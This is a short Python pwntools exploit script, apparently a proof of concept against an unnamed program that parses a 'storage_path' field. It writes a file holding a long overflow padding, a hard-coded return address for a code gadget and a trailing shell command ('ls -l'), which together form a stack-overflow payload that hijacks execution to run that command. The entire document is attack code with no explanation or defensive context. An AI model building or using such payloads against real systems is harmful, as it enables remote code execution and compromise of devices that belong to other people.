from pwn import *

gadget=0x405B1C
#0x76f8ace8
f=open("payload","w")
data='storage_path='+'A'*(0x74948-0x24-4)+p32(gadget)+'a'*(0x28)+'ls -l'
f.write(data)
f.close()
